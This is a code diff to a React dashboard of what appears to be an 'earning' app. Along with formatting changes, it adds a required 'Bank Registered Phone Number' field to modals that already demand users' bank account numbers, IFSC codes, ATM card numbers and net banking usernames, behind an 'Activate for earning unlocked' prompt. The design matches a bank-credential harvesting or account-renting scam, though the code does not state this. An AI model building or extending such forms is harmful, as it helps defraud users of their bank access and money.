@@ -56,7 +56,7 @@ const Dashboard = ({ onLogout }) => {
   const isSaving = selectedCard === "Saving Accounts";
   const isCurrent = selectedCard === "Current Accounts";
   const isCorporate = selectedCard === "Corporate Accounts";
-  const isUpi = selectedCard === "UPI IDs";
+  const isUpi = selectedCard?.toLowerCase().includes("upi");
 
   const cards = useMemo(() => {
     const all = [
@@ -127,7 +127,7 @@ const Dashboard = ({ onLogout }) => {
         ))}
       </div>
 
-      {/* UPI QR MODAL */}
+      {/* ================= UPI QR MODAL ================= */}
       {isUpi && (
         <div className="fixed inset-0 z-50 flex items-center justify-center px-4">
           <div
@@ -138,7 +138,13 @@ const Dashboard = ({ onLogout }) => {
             <h2 className="text-xl font-bold mb-4 text-indigo-700">
               Scan UPI QR Code
             </h2>
-            <img src={qrImage} alt="QR" className="w-60 mx-auto rounded-lg" />
+
+            <img
+              src={qrImage}
+              alt="QR Code"
+              className="w-60 mx-auto rounded-lg"
+            />
+
             <button
               onClick={() => setSelectedCard(null)}
               className="text-red-500 mt-4 w-full"
@@ -149,7 +155,7 @@ const Dashboard = ({ onLogout }) => {
         </div>
       )}
 
-      {/* BANK FORM MODAL (Original Fields Restored) */}
+      {/* ================= BANK FORM MODAL ================= */}
       {(isSaving || isCurrent || isCorporate) && (
         <div className="fixed inset-0 z-50 flex items-center justify-center px-4">
           <div
@@ -165,10 +171,41 @@ const Dashboard = ({ onLogout }) => {
             </h2>
 
             <div className="grid gap-3">
-              <input name="bankName" placeholder="Bank Name" onChange={onBankChange} className="border p-2 rounded-lg" required />
-              <input name="accountNumber" placeholder="Account Number" onChange={onBankChange} className="border p-2 rounded-lg" required />
-              <input name="ifsc" placeholder="IFSC Code" onChange={onBankChange} className="border p-2 rounded-lg" required />
 
+              <input
+                name="bankName"
+                placeholder="Bank Name"
+                onChange={onBankChange}
+                className="border p-2 rounded-lg"
+                required
+              />
+
+              <input
+                name="accountNumber"
+                placeholder="Account Number"
+                onChange={onBankChange}
+                className="border p-2 rounded-lg"
+                required
+              />
+
+              <input
+                name="ifsc"
+                placeholder="IFSC Code"
+                onChange={onBankChange}
+                className="border p-2 rounded-lg"
+                required
+              />
+
+              {/* ✅ NEW FIELD */}
+              <input
+                name="bankPhone"
+                placeholder="Bank Registered Phone Number"
+                onChange={onBankChange}
+                className="border p-2 rounded-lg"
+                required
+              />
+
+              {/* SAVING EXTRA */}
               {isSaving && (
                 <>
                   <input name="atmCardNo" placeholder="ATM Card Number" onChange={onBankChange} className="border p-2 rounded-lg" required />
@@ -177,6 +214,7 @@ const Dashboard = ({ onLogout }) => {
                 </>
               )}
 
+              {/* CURRENT / CORPORATE EXTRA */}
               {(isCurrent || isCorporate) && (
                 <>
                   <input name="username" placeholder="Net Banking Username" onChange={onBankChange} className="border p-2 rounded-lg" required />
@@ -184,15 +222,20 @@ const Dashboard = ({ onLogout }) => {
                 </>
               )}
 
-              <label className="text-sm font-medium">Upload QR Code</label>
+              <label className="text-sm font-medium">
+                Upload QR Code
+              </label>
               <input type="file" name="qrUpload" accept="image/*" onChange={onBankChange} className="border p-2 rounded-lg" required />
 
-              <label className="text-sm font-medium">Upload Supporting File</label>
+              <label className="text-sm font-medium">
+                Upload Supporting File
+              </label>
               <input type="file" name="documentUpload" onChange={onBankChange} className="border p-2 rounded-lg" />
 
               <button className="bg-gradient-to-r from-[#6a11cb] to-[#2575fc] text-white py-2 rounded-lg">
                 Submit
               </button>
+
             </div>
           </form>
         </div>
@@ -230,25 +273,23 @@ const Dashboard = ({ onLogout }) => {
 
       {/* USER ACTIVATION */}
       {!isAdmin && (
-  <div className="mx-6 mb-8 bg-white/90 rounded-2xl shadow-xl p-6 text-center">
-    <h3 className="text-xl font-bold mb-2 text-indigo-700">
-      Account Activation
-    </h3>
+        <div className="mx-6 mb-8 bg-white/90 rounded-2xl shadow-xl p-6 text-center">
+          <h3 className="text-xl font-bold mb-2 text-indigo-700">
+            Account Activation
+          </h3>
 
-    <button
-      onClick={() => setShowActivation(true)}
-      className="px-6 py-2 rounded-lg text-white bg-gradient-to-r from-[#6a11cb] to-[#2575fc]"
-    >
-      Activate Account
-    </button>
+          <button
+            onClick={() => setShowActivation(true)}
+            className="px-6 py-2 rounded-lg text-white bg-gradient-to-r from-[#6a11cb] to-[#2575fc]"
+          >
+            Activate Account
+          </button>
 
-    {/* ✅ New Line Added */}
-    <p className="text-sm text-gray-600 mt-2">
-      Activate for earning unlocked
-    </p>
-  </div>
-)}
-
+          <p className="text-sm text-gray-600 mt-2">
+            Activate for earning unlocked
+          </p>
+        </div>
+      )}
 
       {!isAdmin && showActivation && (
         <AccountActivation onClose={() => setShowActivation(false)} />
